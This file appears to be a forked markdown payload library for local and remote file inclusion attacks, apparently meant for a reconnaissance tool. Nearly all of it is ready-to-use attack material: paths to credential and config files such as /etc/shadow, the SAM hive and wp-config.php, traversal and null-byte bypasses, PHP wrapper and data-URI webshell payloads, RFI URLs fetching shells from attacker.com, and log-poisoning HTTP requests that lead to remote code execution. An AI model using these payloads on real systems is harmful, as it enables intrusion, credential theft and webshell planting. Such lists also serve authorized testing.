<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

# Full LFI/RFI Payload Library (300+ payloads)

## Basic LFI Payloads

### Unix/Linux
```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/passwd.bak
/etc/shadow.bak
/etc/passwd~
/etc/shadow~
/etc/issue
/proc/version
/proc/cmdline
/proc/self/cmdline
/proc/self/environ
/proc/self/status
/proc/1/cmdline
/proc/1/environ
/proc/1/status
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/uptime
/proc/loadavg
/proc/meminfo
/proc/cpuinfo
/proc/interrupts
/proc/modules
/proc/mounts
/proc/partitions
/proc/filesystems
/proc/swaps
/proc/kallsyms
/proc/ioports
/proc/dma
/proc/bus/input/devices
/proc/bus/usb/devices
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/net/unix
/proc/net/sockstat
/proc/net/snmp
/proc/sys/kernel/version
/proc/sys/kernel/hostname
/proc/sys/vm/overcommit_memory
/proc/sys/vm/swappiness
/proc/1/croot
/proc/1/ns/mnt
/proc/1/ns/pid
/proc/1/ns/uts
/proc/1/cgroup
/proc/1/environ
/proc/1/exe
/proc/1/root
/proc/self/loginuid
/proc/self/wchan
/proc/2/cmdline
/proc/2/environ
/proc/2/status
```

### Windows
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\sam
C:\Windows\repair\system
C:\Windows\repair\software
C:\Windows\repair\security
C:\Windows\win.ini
C:\Windows\System32\win.ini
C:\Windows\boot.ini
C:\boot.ini
C:\autoexec.bat
C:\config.sys
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\networks
C:\Windows\System32\drivers\etc\protocol
C:\Windows\System32\drivers\etc\services
C:\Users\Public\Documents\*
C:\ProgramData\Microsoft\Windows\WER\*
C:\Windows\Logs\*
C:\Windows\Temp\*
C:\Windows\Prefetch\*
```

### Common Config Files
```
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/*
/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/*
/etc/mysql/my.cnf
/etc/mysql/mysql.cnf
/etc/postgresql/posgresql.conf
/etc/redis/redis.conf
/etc/php/*/php.ini
/etc/php/*/apache2/php.ini
/etc/php/*/fpm/php.ini
/etc/php*/php.ini
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/configuration.php
/var/www/html/application/config/*
/etc/bind/named.conf
/etc/exim4/exim.conf
/etc/proftpd/proftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/snmp/snmpd.conf
/etc/ldap/ldap.conf
/etc/krb5.conf
/etc/samba/smb.conf
/etc/nsswitch.conf
/etc/rsyslog.conf
/etc/syslog.conf
/etc/cron.d/*
/etc/cron.daily/*
/etc/cron.hourly/*
/etc/crontab
/var/spool/cron/*
```

### Log Files
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/ssl_access.log
/var/log/apache2/ssl_error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/messages
/var/log/syslog
/var/log/auth.log
/var/log/secure
/var/log/maillog
/var/log/cron
/var/log/dpkg.log
/var/log/kern.log
/var/log/user.log
/var/log/btmp
/var/log/lastlog
/var/log/wtmp
```

## LFI Bypass Techniques

### Null Byte
```
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.png
/etc/passwd%00.html
/etc/passwd%00?
/etc/passwd%00..
/etc/passwd%00...
```

### Encoding
```
/etc/passwd
/etc/./passwd
/etc/../etc/passwd
/..//..//..//..//etc/passwd
/etc/passwd/../etc/passwd
/etc/passwd/../../etc/passwd
/etc/passwd/../../../etc/passwd
/etc/passwd/../../../../etc/passwd
/etc/passwd/../../../../../etc/passwd
/etc/passwd/../../../../../../etc/passwd
/etc/passwd/../../../../../../../etc/passwd
/etc/passwd/../../../../../../../../etc/passwd
/etc/passwd/....//....//....//etc/passwd
/etc/passwd/....//....//....//....//etc/passwd
/etc/passwd/././././etc/passwd
/etc/passwd/./././././etc/passwd
/etc/....//....//....//etc/passwd
/etc/....//....//....//....//etc/passwd
```

### Path Traversal Variations
```
....//....//etc/passwd
....//....//....//etc/passwd
....//....//....//....//etc/passwd
....//....//....//....//....//etc/passwd
....//....//....//....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..;/..;/..;/..;/etc/passwd
..;/..;/..;/..;/..;/etc/passwd
/etc/passwd/././././././././././././././././etc/passwd
/etc/passwd/./././././././././././././././etc/passwd
/etc/passwd/../../../etc/passwd/../../../etc/passwd/../../../etc/passwd
/etc/passwd/../../etc/passwd/../../etc/passwd/../../etc/passwd
/etcwd//pass../../../etc/passwd/../../../etc/passwd/../../../etc/passwd
```

### Wrapper Techniques
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=wp-config.php
php://filter/read=convert.base64-encode/resource=index.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
expect://id
compress.zlib:///etc/passwd
zip://etc/passwd
phar://etc/passwd
```

### PHP Wrapper Bypass
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../../../../../etc/passwd
php://filter/read=convert.base64-encode/resource=index.php
php://input
php://input?cmd=ls
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data:text/plain,<?php system($_GET['cmd']);?>
data:text/plain,<?php phpinfo(); ?>
expect://id
expect://ls
expect://whoami
```

## RFI Payloads

### Basic RFI
```
http://attacker.com/shell.txt
http://attacker.com/shell.php
http://attacker.com/shell.txt?
http://attacker.com/shell.txt??
http://attacker.com/shell.txt???
http://attacker.com/shell.txt#
http://attacker.com/shell.txt%00
https://attacker.com/shell.txt
https://attacker.com/shell.php
ftp://attacker.com/shell.txt
```

### RFI with Extensions
```
http://attacker.com/shell
http://attacker.com/shell?
http://attacker.com/shell.txt
http://attacker.com/shell.php
http://attacker.com/shell.php3
http://attacker.com/shell.php4
http://attacker.com/shell.php5
http://attacker.com/shell.phtml
http://attacker.com/shell.inc
http://attacker.com/shell.jpg
http://attacker.com/shell.png
```

### RFI Obfuscation
```
http://attacker.com/evil.txt?.php
http://attacker.com/evil.txt?.html
http://attacker.com/evil.txt%00.php
http://attacker.com/evil.txt%00.html
http://attacker.com/evil.txt%00.jpg
http://attacker.com/evil.txt# .php
http://attacker.com/evil.txt// .php
http://attacker.com/evil.txt/ .php
http://attacker.com/evil.txt?.php?foo=bar
```

### Data URI RFI
```
data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data:text/plain,<?php system($_GET['cmd']); ?>
data:text/html,<script>alert(1)</script>
data:text/html,<script>alert(document.domain)</script>
```

## Log Poisoning

### Apache Access Log
```
<?php system($_GET['cmd']); ?>
<?php phpinfo(); ?>
<?php passthru($_GET['x']); ?>
<?php exec($_GET['cmd']); ?>
```

### SSH Log
```
<?php system($_GET['cmd']); ?>
```

### SMTP Log
```
<?php system($_GET['cmd']); ?>
```

## Session File Inclusion
```
/tmp/sess_SESSIONID
/var/lib/php/sessions/sess_SESSIONID
/var/tmp/sess_SESSIONID
/tmp/sessions/sess_SESSIONID
```

## /proc-based LFI
```
/proc/self/environ
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/fd/3
/proc/self/fd/4
/proc/self/fd/5
/proc/self/fd/6
/proc/self/fd/7
/proc/self/fd/8
/proc/self/fd/9
/proc/self/fd/10
/proc/self/cmdline
/proc/self/status
/proc/self/wchan
/proc/1/environ
/proc/1/exe
/proc/1/root
/proc/1/cwd
/proc/*/environ
/proc/*/cmdline
/proc/*/exe
/proc/*/root
/proc/*/cwd
/proc/[pid]/fd/*
```

## Special Files
```
/dev/stdin
/dev/stdout
/dev/stderr
/dev/null
/dev/zero
/dev/full
/dev/random
/dev/urandom
/dev/pts/0
/dev/pts/1
```

## Container/VM Escape
```
/proc/1/cgroup
/proc/1/root
/proc/1/exe
/proc/1/cmdline
/proc/1/environ
/proc/[pid]/mountinfo
/proc/[pid]/cgroup
/proc/[pid]/ns/*
/sys/kernel/debug/*
/sys/fs/cgroup/*
/proc/mounts
/proc/1/map_files/*
```

## Known CVEs for LFI
```
CVE-2022-34594
CVE-2021-42013
CVE-2021-41773
CVE-2020-8644
CVE-2019-5418
CVE-2019-3396
CVE-2018-12613
CVE-2018-1000620
CVE-2017-12615
CVE-2016-4438
CVE-2015-8562
CVE-2015-5538
CVE-2014-6271
```

## LFI to RCE Techniques

### Via /proc/self/environ
```
GET /vulnerable.php?page=../../../proc/self/environ HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

### Via Log Poisoning
```
GET /vulnerable.php?page=../../../var/log/apache2/access.log HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

### Via SSH Logs
```
GET /vulnerable.php?page=../../../var/log/auth.log HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

### Via PHP Session
```
GET /vulnerable.php?page=../../../var/lib/php/sessions/sess_PHPSESSID HTTP/1.1
```

## Wrapper Payloads
```
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=convert.iconv.UTF-8.UTF-16/resource=index.php
php://filter/string.toupper/resource=index.php
php://filter/string.rot13/resource=index.php
php://filter/convert.base64-decode/resource=index.php
php://input
php://fd/0
php://fd/1
php://fd/2
expect://id
expect://ls
expect://whoami
compress.zlib://etc/passwd
compress.bzip2://etc/passwd
zip://etc/passwd
phar://etc/passwd
ogg://etc/passwd
```

## Template Engines

### Laravel
```
/storage/logs/laravel.log
/storage/framework/sessions/*
/storage/framework/views/*
/bootstrap/cache/*.php
```

### WordPress
```
/wp-content/debug.log
/wp-content/uploads/*
/wp-config.php
/wp-content/plugins/*
/wp-content/themes/*
```

### Django
```
/var/log/django.log
/var/www/html/project/settings.py
/manage.py
```

### Rails
```
/log/production.log
/log/development.log
/config/database.yml
/config/secrets.yml
```

### CodeIgniter
```
/application/logs/*
/application/config/database.php
/application/config/config.php
```
